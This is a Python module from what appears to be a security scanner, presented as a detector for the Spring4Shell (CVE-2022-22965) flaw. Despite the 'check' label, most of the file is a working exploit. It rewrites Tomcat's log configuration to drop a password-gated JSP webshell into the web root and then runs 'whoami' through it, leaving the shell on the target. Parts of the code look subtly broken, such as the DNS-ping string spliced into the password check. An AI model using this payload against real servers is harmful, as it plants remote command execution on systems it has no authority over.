#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2022_22965.py
   Description :   CVE-2022-22965 漏洞检测模块（Spring4Shell 远程命令执行）
   Author :       sule01u
   date：          2023/10/8
"""
import random
import requests
import time
from urllib.parse import urljoin, urlparse
from colorama import Fore
from utils.custom_headers import USER_AGENTS, TIMEOUT
from utils.logging_config import configure_logger

# 初始化日志记录
logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()

# CVE 编号
CVE_ID = "CVE-2022-22965"

# HTTP 请求头配置
HEADERS = {
    "suffix": "%>//",
    "c1": "Runtime",
    "c2": "<%",
    "DNT": "1",
    "User-Agent": random.choice(USER_AGENTS)
}

# 构建漏洞利用的请求参数
LOG_PATTERN = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
LOG_FILE_SUFFIX = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
LOG_FILE_DIR = "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
LOG_FILE_PREFIX = "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar"
LOG_FILE_DATE_FORMAT = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
ARG_PAYLOAD = "?" + "&".join([LOG_PATTERN, LOG_FILE_SUFFIX, LOG_FILE_DIR, LOG_FILE_PREFIX, LOG_FILE_DATE_FORMAT])


def check(url, dns_domain="", proxies=None, session=None, timeout=TIMEOUT):
    """
    检测 Spring4Shell (CVE-2022-22965) 远程代码执行漏洞
    :param url: 目标 URL
    :param dns_domain: DNS 日志域名
    :param proxies: 代理配置
    :param session: 复用的 Session 实例（可选）
    :param timeout: 请求超时时间（秒）
    :return: 如果存在漏洞，返回 (True, 详细信息字典)，否则返回 (False, {})
    """
    # 使用传入的 session，如果没有则创建新的 session
    session = session or requests.Session()
    
    try:
        # 发送 GET 请求检测是否为 tomcat
        target_url = url
        res = session.get(target_url, headers=HEADERS, timeout=timeout, verify=False, proxies=proxies)
        
        # 检查是否为 tomcat 服务器
        server_header = res.headers.get('Server', '').lower()
        if 'tomcat' not in server_header and 'apache' not in server_header:
            logger.info(f"[{CVE_ID} vulnerability not detected - not running on tomcat/apache]", extra={"target": target_url})
            return False, {}
            
        # 构建探测 payload
        jndi_payload = f"tomcatwar.jsp?pwd=j&cmd=ping+-c+1+{CVE_ID}.{dns_domain}"
        
        # 构建请求头
        headers = {
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        # 发送 POST 请求尝试触发漏洞
        data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{jndi_payload}%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.pattern"
        res = session.post(target_url, headers=headers, data=data, timeout=timeout, verify=False, proxies=proxies)
        
        # 检查是否成功上传 webshell
        if res.status_code >= 200 and res.status_code < 300:
            # 尝试访问上传的 webshell
            webshell_url = urljoin(url, "tomcatwar.jsp")
            res = session.get(f"{webshell_url}?pwd=j&cmd=whoami", headers=HEADERS, timeout=timeout, verify=False, proxies=proxies)
            
            if res.status_code == 200 and (res.text.strip() != "" or "tomcatwar.jsp" in res.text):
                details = f"{CVE_ID} vulnerability detected at {target_url} - Webshell at {webshell_url}"
                logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
                return True, {
                    "CVE_ID": CVE_ID,
                    "URL": target_url,
                    "Details": details,
                    "Webshell": webshell_url
                }
        
        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
        return False, {}
        
    except (requests.Timeout, requests.ConnectionError, requests.RequestException) as e:
        # 捕获所有请求异常，并记录到日志
        logger.error(f"[Request Error：{e}]", extra={"target": url})
        return False, {}
    except Exception as e:
        logger.error(f"[Unknown Error：{e}]", extra={"target": url})
        return False, {}
    finally:
        # 如果 session 是本模块创建的，则关闭（否则保持复用的 session 不被关闭）
        if not session:
            session.close()


if __name__ == '__main__':
    # 测试用例
    proxy = {"http": "http://user:password@localhost:8080", "https": "http://user:password@localhost:8080"}

    # 测试 CVE-2022-22965 漏洞检测
    is_vul, res = check("http://localhost:8080/", proxies=proxy)
    print(is_vul, res)